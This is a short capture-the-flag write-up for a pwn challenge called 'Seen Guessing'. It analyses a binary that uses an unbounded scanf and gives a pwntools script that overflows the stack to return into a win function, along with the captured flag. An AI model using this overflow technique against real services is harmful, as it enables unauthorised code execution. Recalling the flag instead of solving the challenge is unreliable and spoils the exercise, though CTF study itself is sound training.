https://ctftime.org/event/2601

# Seen Guessing (pwn)

Guess all the seens and you'll be rewarded with something special.

nc 164.92.176.247 5002

## Analysis

`main` @ `0x40127b`:

- Calls `scanf("%100s", local_28)` 7 times.
- Compares the attack controlled input to the strings pointed to by an array of `char *` called `seens` with `strcasecmp`

`win` @ `0x401216`:

- Reads the flag and prints it to stdout.

## Solution

1) Read the memory that contains the expected strings from the elf.
2) Provide each expected string padded up to 0x28 bytes.
    - Note that the string comparison will stop at the null-terminator so we don't really care how long the string is or what comes after this.
3) ret2win.
    - Note that technically we rewrite the return address 7 times you could do less than 7 times and it will still work.

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./chall", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("164.92.176.247", 5002)

for i in range(7):
    seen_addr = u64(elf.read(elf.sym["seens"] + (i*8), 8))
    p.sendlineafter(b"Enter a Seen: ", elf.read(seen_addr, 0x28) + p64(elf.sym["win"]))

p.readuntil(b"{")

print("FMCTF" + p.readuntil(b"}").decode()) # FMCTF{db8aa102093c65b674a0c216dac7cd73}
```

## Flag
`FMCTF{db8aa102093c65b674a0c216dac7cd73}`

smiley 2025/03/16
